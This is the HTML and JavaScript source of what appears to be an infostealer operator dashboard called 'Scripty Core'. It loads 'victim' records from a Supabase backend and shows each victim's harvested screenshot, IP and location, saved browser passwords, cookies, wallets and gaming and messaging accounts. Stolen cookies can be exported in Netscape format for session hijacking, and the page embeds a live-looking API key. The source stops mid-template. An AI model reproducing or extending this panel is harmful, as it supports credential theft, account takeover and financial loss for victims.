<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Scripty Core · Hit</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <link rel="icon" href="data:;base64,iVBORw0KGgo=" />
    <style>
        /* ===== Full Theme ===== */
        /* Firefox */
        * {
          scrollbar-width: thin;
          scrollbar-color: #6b7280 #111827;
        }
        
        /* Chrome, Edge, Safari */
        ::-webkit-scrollbar {
          width: 12px;
          height: 12px;
        }
        
        ::-webkit-scrollbar-track {
          background: #111827;
          border-radius: 999px;
        }
        
        ::-webkit-scrollbar-thumb {
          background: linear-gradient(
            180deg,
            #8b5cf6,
            #6366f1
          );
          border-radius: 999px;
          border: 3px solid #111827;
          transition: background 0.2s ease;
        }
        
        ::-webkit-scrollbar-thumb:hover {
          background: linear-gradient(
            180deg,
            #a78bfa,
            #818cf8
          );
        }
        
        ::-webkit-scrollbar-thumb:active {
          background: linear-gradient(
            180deg,
            #7c3aed,
            #4f46e5
          );
        }
        
        ::-webkit-scrollbar-corner {
          background: #111827;
        }
        :root {
            --bg-primary: #06080f;
            --bg-secondary: #0a0e1a;
            --bg-tertiary: #101525;
            --bg-hover: #161c30;
            --border-color: rgba(100, 150, 255, 0.12);
            --text-primary: #eef2fa;
            --text-secondary: #9aa8c2;
            --text-muted: #5a6a85;
            --accent: #ff2255;
            --neon-pink: #ff44aa;
            --neon-blue: #00aaff;
            --neon-cyan: #00ffdd;
            --neon-purple: #aa55ff;
            --neon-green: #00ff88;
            --success: #00ff88;
            --danger: #ff2255;
            --warning: #ffcc00;
            --radius-sm: 6px;
            --radius-md: 10px;
            --radius-lg: 14px;
            --font-sans: 'Inter', sans-serif;
            --font-mono: 'JetBrains Mono', monospace;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: var(--bg-primary);
            color: var(--text-primary);
            font-family: var(--font-sans);
            overflow: hidden;
            height: 100vh;
        }
        body::before {
            content: '';
            position: fixed;
            inset: 0;
            pointer-events: none;
            z-index: 0;
            background:
                linear-gradient(rgba(0,170,255,0.06) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0,170,255,0.06) 1px, transparent 1px),
                radial-gradient(ellipse 900px 900px at 0% 100%, rgba(255,34,85,0.35) 0%, transparent 50%),
                radial-gradient(ellipse 850px 850px at 100% 0%, rgba(0,170,255,0.30) 0%, transparent 50%),
                radial-gradient(ellipse 700px 700px at 50% 50%, rgba(170,85,255,0.22) 0%, transparent 50%);
            background-size: 50px 50px, 50px 50px, 100% 100%, 100% 100%, 100% 100%;
            animation: bgDrift 18s ease-in-out infinite alternate;
        }
        @keyframes bgDrift {
            0% { background-position: 0 0, 0 0, 5% 95%, 95% 5%, 50% 50%; }
            100% { background-position: 0 0, 0 0, 15% 78%, 78% 22%, 48% 52%; }
        }
        .app-container { display: flex; height: 100vh; position: relative; z-index: 1; margin-left: 260px; }
        .sidebar {
            position: fixed; top: 0; left: 0; width: 260px; height: 100vh;
            background: linear-gradient(180deg, var(--bg-secondary), rgba(8,12,22,0.98));
            border-right: 1px solid var(--border-color);
            display: flex; flex-direction: column; z-index: 1000;
            box-shadow: 1px 0 40px rgba(0,170,255,0.08);
        }
        .sidebar::before {
            content: ''; position: absolute; inset: 0; pointer-events: none;
            background: radial-gradient(ellipse 200px 300px at 0% 0%, rgba(255,34,85,0.08) 0%, transparent 70%),
                        radial-gradient(ellipse 180px 250px at 0% 100%, rgba(0,170,255,0.06) 0%, transparent 70%);
            z-index: 0;
        }
        .sidebar > * { position: relative; z-index: 1; }
        .sidebar-header {
            padding: 24px; border-bottom: 1px solid var(--border-color);
            position: relative;
        }
        .sidebar-header::after {
            content: ''; position: absolute; bottom: -1px; left: 24px; right: 24px;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--accent), var(--neon-pink), var(--neon-blue), transparent);
            opacity: 0.7;
        }
        .sidebar-logo {
            display: flex; align-items: center; gap: 12px; font-size: 17px; font-weight: 700;
            background: linear-gradient(135deg, var(--accent), var(--neon-pink));
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }
        .sidebar-logo i { font-size: 28px; color: var(--accent); filter: drop-shadow(0 0 12px rgba(255,34,85,0.6)); }
        .sidebar-nav { flex: 1; overflow-y: auto; padding: 16px 12px; }
        .sidebar-section { margin-bottom: 20px; }
        .sidebar-section-toggle {
            display: flex; align-items: center; justify-content: space-between; width: 100%;
            padding: 8px 12px; background: none; border: none; cursor: pointer;
            color: var(--text-muted); font-size: 11px; font-weight: 600; text-transform: uppercase;
            letter-spacing: 0.8px; transition: 0.15s;
        }
        .sidebar-section-toggle:hover { background: var(--bg-hover); border-radius: var(--radius-sm); }
        .sidebar-section-title { background: linear-gradient(90deg, var(--neon-pink), var(--neon-purple)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .sidebar-section-chevron { width: 14px; height: 14px; transition: transform 0.2s; color: var(--text-muted); }
        .sidebar-section.collapsed .sidebar-section-chevron { transform: rotate(-90deg); }
        .sidebar-section-links { overflow: hidden; max-height: 500px; transition: max-height 0.25s; }
        .sidebar-section.collapsed .sidebar-section-links { max-height: 0; }
        .sidebar-link {
            display: flex; align-items: center; gap: 12px; padding: 11px 14px;
            color: var(--text-secondary); text-decoration: none; font-size: 14px; font-weight: 500;
            border-radius: var(--radius-md); transition: all 0.2s; margin-bottom: 2px; cursor: pointer;
        }
        .sidebar-link:hover { background: var(--bg-hover); color: var(--text-primary); }
        .sidebar-link.active {
            background: rgba(255,34,85,0.08); color: var(--accent); border-left: 3px solid var(--accent);
        }
        .sidebar-link i { width: 18px; text-align: center; opacity: 0.7; }
        .sidebar-link:hover i, .sidebar-link.active i { opacity: 1; }
        .sidebar-link.locked { opacity: 0.35; cursor: not-allowed; }
        .sidebar-lock-icon { margin-left: auto; opacity: 0.6; width: 14px; height: 14px; }
        .sidebar-footer {
            padding: 16px 20px;
            border-top: 1px solid var(--border-color);
            cursor: pointer;
        }
        .sidebar-user {
            display: flex;
            align-items: center;
            gap: 12px;
            text-decoration: none;
            padding: 8px 10px;
            border-radius: 8px;
            transition: 0.2s;
        }
        .sidebar-user:hover { background: rgba(255,255,255,0.05); }
        .sidebar-user-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            flex-shrink: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, var(--accent), #aa55ff);
            border: 2px solid transparent;
            background-clip: padding-box;
            position: relative;
            overflow: hidden;
        }
        .sidebar-user-avatar::before {
            content: '';
            position: absolute;
            inset: -2px;
            border-radius: 50%;
            background: linear-gradient(135deg, var(--accent), var(--neon-pink), var(--neon-blue));
            z-index: -1;
            opacity: 0.8;
            box-shadow: 0 0 15px rgba(255,34,85,0.4);
        }
        .sidebar-user-avatar img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            border-radius: 50%;
            display: none;
        }
        .sidebar-user-avatar i {
            font-size: 18px;
            color: white;
        }
        .sidebar-user-name {
            font-size: 13px;
            font-weight: 500;
            color: var(--text-secondary);
        }
        .sidebar-email {
            font-size: 11px;
            color: var(--text-muted);
        }
        .main-content { flex: 1; overflow-y: auto; padding: 32px 40px; background: transparent; }
        .page-header { margin-bottom: 32px; }
        .page-title {
            font-size: 26px; font-weight: 700;
            background: linear-gradient(135deg, var(--accent), var(--neon-pink), var(--neon-blue));
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }
        .page-description { color: var(--text-secondary); font-size: 15px; }
        .card {
            background: var(--bg-secondary); border: 1px solid var(--border-color);
            border-radius: var(--radius-lg);
            padding: 24px;
            margin-bottom: 24px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.5);
            transition: border-color 0.3s, box-shadow 0.3s;
        }
        .card:hover { border-color: rgba(0,170,255,0.25); box-shadow: 0 0 30px rgba(0,170,255,0.08); }
        .card-header {
            display: flex; align-items: center; justify-content: space-between;
            margin-bottom: 16px;
            padding-bottom: 16px;
            border-bottom: 1px solid var(--border-color);
        }
        .card-title {
            font-size: 16px; font-weight: 600; display: flex; align-items: center; gap: 10px;
            background: linear-gradient(135deg, var(--neon-blue), var(--neon-cyan), var(--neon-purple));
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }

        /* ===== Hit Grid & Cards ===== */
        .hit-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 1.5rem; margin-bottom: 2rem; }
        .hit-card {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-lg);
            overflow: hidden;
            transition: all 0.3s ease;
        }
        .hit-card:hover { border-color: rgba(0,170,255,0.2); box-shadow: 0 0 30px rgba(0,170,255,0.08); }
        .hit-card-header {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            padding: 1rem 1.25rem;
            background: var(--bg-tertiary);
            border-bottom: 1px solid var(--border-color);
            font-weight: 600;
            color: var(--text-primary);
            position: relative;
        }
        .hit-card-header::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 1rem;
            right: 1rem;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--neon-blue), var(--neon-cyan), transparent);
            opacity: 0.4;
        }
        .hit-card-header span {
            background: linear-gradient(135deg, var(--neon-blue), var(--neon-cyan));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .hit-card-header i { color: var(--neon-blue); filter: drop-shadow(0 0 6px rgba(0,170,255,0.5)); }
        .hit-card-body { padding: 1.25rem; }
        .info-badge {
            margin-left: auto;
            padding: 0.25rem 0.5rem;
            background: linear-gradient(135deg, rgba(0,170,255,0.15), rgba(0,255,221,0.1));
            border: 1px solid rgba(0,170,255,0.25);
            border-radius: var(--radius-sm);
            font-size: 0.75rem;
            font-weight: 500;
            color: var(--neon-cyan);
            text-transform: uppercase;
        }
        .info-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 1rem; }
        .info-item { display: flex; flex-direction: column; gap: 0.25rem; }
        .info-label { font-size: 0.75rem; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.05em; }
        .info-value { font-size: 0.875rem; color: var(--text-primary); word-break: break-word; }
        .copyable { cursor: pointer; transition: all 0.2s ease; }
        .copyable:hover { color: var(--neon-cyan); text-shadow: 0 0 10px rgba(0,255,221,0.5); }

        /* ===== Section Headers (clickable) ===== */
        .hit-section {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-lg);
            margin-bottom: 1.5rem;
            overflow: hidden;
            transition: all 0.3s ease;
        }
        .hit-section:hover { border-color: rgba(170,85,255,0.2); box-shadow: 0 0 30px rgba(170,85,255,0.08); }
        .section-header {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            padding: 1rem 1.25rem;
            background: var(--bg-tertiary);
            border-bottom: 1px solid var(--border-color);
            font-weight: 600;
            color: var(--text-primary);
            cursor: pointer;
            user-select: none;
            transition: background 0.2s;
        }
        .section-header:hover { background: var(--bg-hover); }
        .section-header span {
            background: linear-gradient(135deg, var(--neon-pink), var(--neon-purple));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .section-header i { color: var(--neon-pink); filter: drop-shadow(0 0 6px rgba(255,68,170,0.5)); }

        /* Count */
        .section-count {
            padding: 0.25rem 0.75rem;
            background: linear-gradient(135deg, var(--neon-pink), var(--neon-purple));
            border-radius: 9999px;
            font-size: 0.75rem;
            color: white;
            box-shadow: 0 0 12px rgba(170,85,255,0.4);
            margin-left: auto;
        }

        /* ===== Collapsible content (only for sections that have it) ===== */
        .section-content {
            max-height: 3000px;
            overflow: hidden;
            transition: max-height 0.4s ease, opacity 0.3s ease, padding 0.3s ease;
            opacity: 1;
        }
        .hit-section.collapsed .section-content {
            max-height: 0 !important;
            opacity: 0;
            padding: 0 0;
        }
        .section-header .chevron {
            margin-left: 0.5rem;
            transition: transform 0.3s ease;
            font-size: 0.9rem;
            color: var(--text-muted);
        }
        .hit-section.collapsed .section-header .chevron {
            transform: rotate(-90deg);
        }

        /* ===== Table ===== */
        .table-container { overflow-x: auto; }
        .data-table {
            width: 100%;
            border-collapse: collapse;
        }
        .data-table th,
        .data-table td {
            padding: 0.75rem 1rem;
            text-align: left;
            border-bottom: 1px solid var(--border-color);
            max-width: 200px;
        }
        .data-table thead {
            position: relative;
        }
        .data-table thead::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 1rem;
            right: 1rem;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--neon-purple), var(--neon-pink), transparent);
            opacity: 0.4;
        }
        .data-table th {
            font-size: 0.75rem;
            font-weight: 600;
            color: var(--text-secondary);
            text-transform: uppercase;
            letter-spacing: 0.05em;
            background: var(--bg-tertiary);
            position: sticky;
            top: 0;
        }
        .data-table tbody tr {
            transition: all 0.2s ease;
        }
        .data-table tbody tr:nth-child(even) {
            background: rgba(170,85,255,0.03);
        }
        .data-table tbody tr:nth-child(odd) {
            background: rgba(255,68,170,0.02);
        }
        .data-table tbody tr:hover {
            background: linear-gradient(90deg, rgba(170,85,255,0.12) 0%, rgba(255,68,170,0.06) 50%, rgba(0,170,255,0.03) 100%);
            box-shadow: inset 0 0 40px rgba(170,85,255,0.06), inset 3px 0 0 var(--neon-purple);
        }
        .data-table tbody tr:hover td { background: transparent; }
        .data-table td.copyable:hover { color: var(--accent); }

        /* ===== Truncation ===== */
        .truncate {
            max-width: 180px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            display: inline-block;
            vertical-align: middle;
        }
        .url-cell { max-width: 220px; }
        .token-cell { max-width: 160px; }

        /* ===== Password Cell ===== */
        .password-cell {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            font-family: var(--font-mono);
            font-size: 0.85rem;
        }
        .password-revealed { display: none; }
        .password-cell.revealed .password-masked { display: none; }
        .password-cell.revealed .password-revealed { display: inline; }
        .reveal-btn {
            background: none;
            border: none;
            padding: 0.25rem;
            cursor: pointer;
            color: var(--text-secondary);
            transition: color 0.2s;
        }
        .reveal-btn:hover { color: var(--accent); }
        .reveal-btn i { font-size: 1rem; }
        .eye-off-icon { display: none; }
        .password-cell.revealed .eye-icon { display: none; }
        .password-cell.revealed .eye-off-icon { display: inline; }

        /* ===== Cookies ===== */
        .cookies-container { padding: 1.25rem; }
        .cookie-profiles { display: flex; flex-direction: column; gap: 1rem; }
        .cookie-profile {
            background: var(--bg-tertiary);
            border-radius: var(--radius-md);
            overflow: hidden;
            border: 1px solid transparent;
            transition: all 0.2s ease;
        }
        .cookie-profile:hover { border-color: rgba(0,255,136,0.2); box-shadow: 0 0 20px rgba(0,255,136,0.1); }
        .cookie-profile-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0.75rem 1rem;
            gap: 1rem;
            flex-wrap: wrap;
        }
        .cookie-profile-info { display: flex; align-items: center; gap: 0.75rem; flex-wrap: wrap; }
        .cookie-browser {
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 0.3rem;
            background: linear-gradient(135deg, var(--neon-green), var(--neon-cyan));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .cookie-browser i { font-size: 0.9rem; }
        .cookie-profile-name { color: var(--text-secondary); font-size: 0.875rem; }
        .cookie-count {
            padding: 0.25rem 0.5rem;
            background: var(--bg-secondary);
            border-radius: var(--radius-sm);
            font-size: 0.75rem;
            color: var(--text-secondary);
        }
        .cookie-actions { display: flex; gap: 0.5rem; }

        /* ===== Files ===== */
        .files-container { padding: 1.25rem; }
        .file-categories { display: flex; flex-direction: column; gap: 1.5rem; }
        .file-category-header { display: flex; align-items: center; gap: 0.75rem; margin-bottom: 0.75rem; }
        .file-category-name {
            font-weight: 600;
            background: linear-gradient(135deg, var(--neon-purple), var(--neon-blue));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .file-category-count {
            padding: 0.25rem 0.5rem;
            background: var(--bg-tertiary);
            border-radius: var(--radius-sm);
            font-size: 0.75rem;
            color: var(--text-secondary);
        }
        .file-list { display: flex; flex-direction: column; gap: 0.5rem; }
        .file-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0.6rem 1rem;
            background: var(--bg-tertiary);
            border-radius: var(--radius-md);
            border: 1px solid transparent;
            transition: all 0.2s ease;
        }
        .file-item:hover { border-color: rgba(170,85,255,0.2); box-shadow: 0 0 15px rgba(170,85,255,0.1); }
        .file-info { display: flex; align-items: center; gap: 0.75rem; }
        .file-info i { color: var(--text-secondary); }
        .file-name { font-size: 0.875rem; color: var(--text-primary); }
        .file-size { font-size: 0.75rem; color: var(--text-secondary); }

        /* ===== Screenshot ===== */
        .screenshot-section { margin-bottom: 2rem; }
        .screenshot-container { padding: 1.25rem; display: flex; justify-content: center; }
        .screenshot-img {
            max-width: 100%;
            max-height: 400px;
            border-radius: var(--radius-md);
            cursor: pointer;
            transition: all 0.3s ease;
            border: 2px solid transparent;
        }
        .screenshot-img:hover {
            transform: scale(1.02);
            border-color: var(--neon-blue);
            box-shadow: 0 0 30px rgba(0,170,255,0.3);
        }
        .screenshot-overlay {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.9);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            padding: 2rem;
        }
        .screenshot-lightbox { position: relative; max-width: 95vw; max-height: 95vh; }
        .screenshot-lightbox img { max-width: 100%; max-height: 90vh; border-radius: var(--radius-md); }
        .lightbox-close {
            position: absolute;
            top: -40px;
            right: 0;
            background: none;
            border: none;
            color: white;
            cursor: pointer;
            padding: 0.5rem;
            font-size: 24px;
            transition: color 0.2s;
        }
        .lightbox-close:hover { color: var(--accent); }

        /* ===== Table scrollable ===== */
        .table-scrollable { max-height: 400px; overflow-y: auto; }
        .table-scrollable thead { position: sticky; top: 0; z-index: 2; background: var(--bg-tertiary); }

        /* ===== Buttons ===== */
        .btn {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            padding: 0.5rem 1rem;
            border: none;
            border-radius: var(--radius-md);
            font-size: 0.875rem;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            text-decoration: none;
        }
        .btn i { font-size: 16px; }
        .btn-sm { padding: 0.375rem 0.75rem; font-size: 0.8rem; }
        .btn-primary {
            background: linear-gradient(135deg, var(--accent), var(--neon-pink));
            color: white;
            box-shadow: 0 0 10px rgba(255,68,170,0.2);
        }
        .btn-primary:hover { background: linear-gradient(135deg, var(--neon-pink), var(--accent)); box-shadow: 0 0 20px rgba(255,68,170,0.4); }
        .btn-secondary {
            background: var(--bg-secondary);
            color: var(--text-primary);
            border: 1px solid var(--border-color);
        }
        .btn-secondary:hover { background: var(--bg-tertiary); border-color: var(--neon-blue); box-shadow: 0 0 12px rgba(0,170,255,0.2); }
        .btn-success {
            background: linear-gradient(135deg, var(--success), var(--neon-cyan));
            color: #0a0a0f;
            box-shadow: 0 0 12px rgba(0,255,136,0.3);
        }
        .btn-success:hover { box-shadow: 0 0 24px rgba(0,255,136,0.5); }
        .btn-danger {
            background: linear-gradient(135deg, var(--danger), #cc1133);

            box-shadow: 0 0 12px rgba(255,34,85,0.3);

        /* ===== Utilities ===== */

        .flex { display: flex; }
        .items-center { align-items: center; }
        .gap-1 { gap: 8px; }
        .gap-2 { gap: 12px; }
        .mt-2 { margin-top: 16px; }
        .text-muted { color: var(--text-muted); }
        .text-accent { color: var(--accent); }
        .text-cyan { color: var(--neon-cyan); }
        .text-pink { color: var(--neon-pink); }
        .text-success { color: var(--success); }
        .text-purple { color: var(--neon-purple); }

        /* ===== Responsive ===== */

            display: none;
            position: fixed;
            top: 16px; left: 16px;
            z-index: 1001;
            background: var(--bg-secondary);

            border-radius: var(--radius-md);
            color: var(--accent);
            padding: 12px;
            cursor: pointer;

        }
        @media (max-width: 768px) {
            .app-container { margin-left: 0; }
            .sidebar { transform: translateX(-100%); transition: transform 0.3s; }
            body.sidebar-open .sidebar { transform: translateX(0); }
            .main-content { padding: 20px; }
            .grid-4 { grid-template-columns: 1fr; }
            .hit-grid { grid-template-columns: 1fr; }
            .info-grid { grid-template-columns: 1fr; }

        .sidebar-backdrop {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.6);
            z-index: 999;
        }
        body.sidebar-open .sidebar-backdrop { display: block; }
        .page-header-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1rem;
        }
        .back-link {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            color: var(--text-secondary);
            text-decoration: none;
            font-size: 0.875rem;

            cursor: pointer;
        }
        .back-link:hover { color: var(--neon-cyan); text-shadow: 0 0 10px rgba(0,255,221,0.4); }
        .back-link i { font-size: 14px; }
    </style>
</head>
<body>
        <!-- VIP Overlay -->

    <div class="app-container">

    </div>

    <script>
        (function() {
            // Supabase client
            if (typeof window.__sbClient === 'undefined') {
                const SUPABASE_URL = "https://zjtkdztrwqrjqquygtbr.supabase.co";
                const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpqdGtkenRyd3FyanFxdXlndGJyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODI4MTE2NDEsImV4cCI6MjA5ODM4NzY0MX0.t8eT3QHOPY50dL_oIpJrXTxQHMJi6rCjUU-f3OmLJxI";
                window.__sbClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
            }
            const supabaseClient = window.__sbClient;

            // Browser icon mapping
            const browserIcons = {
                'Chrome': 'fab fa-chrome',
                'Edge': 'fab fa-edge',
                'Firefox': 'fab fa-firefox',
                'Opera': 'fab fa-opera',
                'Brave': 'fab fa-brave',
                'Vivaldi': 'fab fa-vivaldi',
                'Yandex': 'fab fa-yandex',
                'Comet': 'fas fa-comet',
                'Zen': 'fas fa-zen',
                'Unknown': 'fas fa-globe',
            };
            // ===== VIP USERS =====
            const VIP_USERS = [
                '60e9045c-274e-4573-b2cb-87493563b7a2',   // your own ID
                // add more user IDs here
            ];
                    
            function checkVip(userId) {
                const overlay = document.getElementById('vipOverlay');
                if (!overlay) return;
                if (VIP_USERS.includes(userId)) {
                    overlay.style.display = 'none';
                    document.querySelector('.app-container')?.style.setProperty('display', 'flex');
                } else {
                    overlay.style.display = 'flex';
                    document.querySelector('.app-container')?.style.setProperty('display', 'none');
                }
            }

            // Get victim ID from URL
            function getVictimId() {
                const path = window.location.pathname;
                const match = path.match(/\/hit\/([^\/]+)/i);
                if (match) return match[1];
                const params = new URLSearchParams(window.location.search);
                return params.get('id') || params.get('view');
            }

            function safeParseData(dataStr) {
                if (!dataStr) return {};
                if (typeof dataStr === 'object') return dataStr;
                try { return JSON.parse(dataStr); } catch(e) { return {}; }
            }

            function formatSize(bytes) {
                if (!bytes) return '0 B';
                const units = ['B', 'KB', 'MB', 'GB'];
                let i = 0;
                while (bytes >= 1024 && i < units.length - 1) { bytes /= 1024; i++; }
                return bytes.toFixed(i > 0 ? 1 : 0) + ' ' + units[i];
            }

            // groupFiles - simple grouping (no filtering)
            function groupFiles(files) {
                const groups = {};
                files.forEach(f => {
                    const type = f.fileType || 'Other';
                    if (!groups[type]) groups[type] = [];
                    groups[type].push(f);
                });
                return groups;
            }

            function generateNetscapeCookies(cookies) {
                let lines = ['# Netscape HTTP Cookie File', '# Generated by Scripty Core', ''];
                cookies.forEach(c => {
                    const host = c.hostKey || c.host || '';
                    const hostOnly = host.startsWith('.') ? 'FALSE' : 'TRUE';
                    const path = c.path || '/';
                    const secure = 'FALSE';
                    const expiry = c.expiresUtc ? Math.floor(c.expiresUtc / 1000000) : '1893456000';
                    const name = c.name || '';
                    const value = c.value || '';
                    lines.push(`${host}\t${hostOnly}\t${path}\t${secure}\t${expiry}\t${name}\t${value}`);
                });
                return lines.join('\n');
            }

            // ===== RENDER DETAILS =====
            function renderDetails(victim) {
                const data = safeParseData(victim.data);
                const system = data.system || {};
                const passwords = data.passwords || [];
                const cookies = data.cookies || [];
                // IMPORTANT: no filter – use raw additionalFiles
                const additionalFiles = data.additionalFiles || [];
                const screenshot = data.screenshot || null;
                const discordAccounts = data.discord_accounts || [];
                const wallets = data.wallets || {};
                const walletNames = Object.keys(wallets);
                const wifiNetworks = data.wifi_networks || [];
                const roblox = data.roblox;
                const steam = data.steam || {};
                const telegram = data.telegram || false;

                const sysFields = [
                    { label: 'Username', value: system.user || victim.username || 'N/A' },
                    { label: 'PC Name', value: system.hostname || victim.hostname || 'N/A' },
                    { label: 'OS Version', value: system.os || victim.os || 'N/A' },
                    { label: 'CPU', value: system.cpu || 'N/A' },
                    { label: 'GPU', value: system.gpu || 'N/A' },
                    { label: 'RAM', value: system.ram || 'N/A' },
                ];
                const connFields = [
                    { label: 'IP Address', value: victim.ip || 'N/A' },
                    { label: 'Country', value: victim.country || 'N/A' },
                    { label: 'City', value: data.city || 'N/A' },
                    { label: 'ISP', value: data.isp || 'N/A' },
                    { label: 'Tag', value: data.tag || 'Default' },
                    { label: 'Environment', value: data.executionEnvironment || 'EXE' },
                    { label: 'Type', value: data.executionEnvironmentType || 'CPyRuntime' },
                ];

                // Group cookies by browser + profile
                const cookieGroups = {};
                cookies.forEach(c => {
                    const key = `${c.browser || 'Unknown'}_${c.profile || 'Default'}`;
                    if (!cookieGroups[key]) cookieGroups[key] = { browser: c.browser || 'Unknown', profile: c.profile || 'Default', cookies: [] };
                    cookieGroups[key].cookies.push(c);
                });

                let html = '';

                // ----- Screenshot -----
                html += `<div class="hit-section screenshot-section">
                    <div class="section-header"><i class="fas fa-camera"></i><span>Screenshot</span></div>
                    <div class="screenshot-container">${screenshot ? `<img src="${screenshot}" alt="Screenshot" class="screenshot-img" onclick="window.openScreenshot(this.src)">` : '<div class="empty">No screenshot available</div>'}</div>
                </div>`;

                // ----- System & Connection Info -----
                html += `<div class="hit-grid">
                    <div class="hit-card">
                        <div class="hit-card-header"><i class="fas fa-desktop"></i><span>System Information</span><span class="info-badge">full</span></div>
                        <div class="hit-card-body"><div class="info-grid">${sysFields.map(f => `<div class="info-item"><span class="info-label">${f.label}</span><span class="info-value copyable" data-copy="${f.value}">${f.value}</span></div>`).join('')}</div></div>
                    </div>
                    <div class="hit-card">
                        <div class="hit-card-header"><i class="fas fa-globe"></i><span>Connection Info</span></div>
                        <div class="hit-card-body"><div class="info-grid">${connFields.map(f => `<div class="info-item"><span class="info-label">${f.label}</span><span class="info-value copyable" data-copy="${f.value}">${f.value}</span></div>`).join('')}</div></div>
                    </div>
                </div>`;

                // ----- Passwords (collapsible) -----
                html += `<div class="hit-section">
                    <div class="section-header">
                        <i class="fas fa-key"></i><span>Passwords</span>
                        <span class="section-count">${passwords.length || data.total_passwords || 0}</span>
                        <i class="fas fa-chevron-down chevron"></i>
                    </div>
                    <div class="section-content">
                        ${passwords.length > 0 ? `<div class="table-container table-scrollable">
                            <table class="data-table">
                                <thead><tr><th>URL</th><th>Username</th><th>Password</th><th>Browser</th><th>Profile</th></tr></thead>
                                <tbody>${passwords.map(p => {
                                    const icon = browserIcons[p.browser] || 'fas fa-globe';
                                    const url = p.url || 'N/A';
                                    const username = p.username || 'N/A';
                                    return `<tr>
                                        <td class="copyable" data-copy="${url}"><span class="truncate url-cell">${url}</span></td>
                                        <td class="copyable" data-copy="${username}"><span class="truncate">${username}</span></td>
                                        <td class="password-cell">
                                            <span class="password-masked">********</span>
                                            <span class="password-revealed">${p.password || ''}</span>
                                            <button class="reveal-btn" onclick="window.togglePassword(this)">
                                                <i class="fas fa-eye eye-icon"></i>
                                                <i class="fas fa-eye-slash eye-off-icon"></i>
                                            </button>
                                        </td>
                                        <td><i class="${icon}"></i> ${p.browser || 'N/A'}</td>
                                        <td>${p.profile || 'Default'}</td>
                                    </tr>`;
                                }).join('')}</tbody>
                            </table>
                        </div>` : `<div class="empty">No passwords found.</div>`}
                    </div>
                </div>`;

                // ----- Cookies (collapsible) -----
                html += `<div class="hit-section">
                    <div class="section-header">
                        <i class="fas fa-cookie-bite"></i><span>Cookies</span>
                        <span class="section-count">${cookies.length || data.total_cookies || 0}</span>
                        <i class="fas fa-chevron-down chevron"></i>
                    </div>
                    <div class="section-content">
                        ${Object.keys(cookieGroups).length > 0 ? `<div class="cookies-container"><div class="cookie-profiles">${Object.values(cookieGroups).map(group => {
                            const icon = browserIcons[group.browser] || 'fas fa-globe';
                            return `<div class="cookie-profile" data-browser="${group.browser}" data-profile="${group.profile}">
                                <div class="cookie-profile-header">
                                    <div class="cookie-profile-info">
                                        <span class="cookie-browser"><i class="${icon}"></i> ${group.browser}</span>
                                        <span class="cookie-profile-name">${group.profile}</span>
                                        <span class="cookie-count">${group.cookies.length} cookies</span>
                                    </div>
                                    <div class="cookie-actions">
                                        <button class="btn btn-sm btn-secondary" onclick="window.copyCookieGroup(this)"><i class="fas fa-copy"></i> Copy</button>
                                        <button class="btn btn-sm btn-primary" onclick="window.downloadCookieGroup(this)"><i class="fas fa-download"></i> Download</button>
                                    </div>
                                </div>
                            </div>`;
                        }).join('')}</div></div>` : `<div class="empty">No cookies found.</div>`}
                    </div>
                </div>`;

                // ----- Additional Files (NO COLLAPSE, NO FILTER) – exact old working version -----
                html += `<div class="hit-section">
                    <div class="section-header">
                        <i class="fas fa-file"></i><span>Additional Files</span>
                        <span class="section-count">${additionalFiles.length}</span>
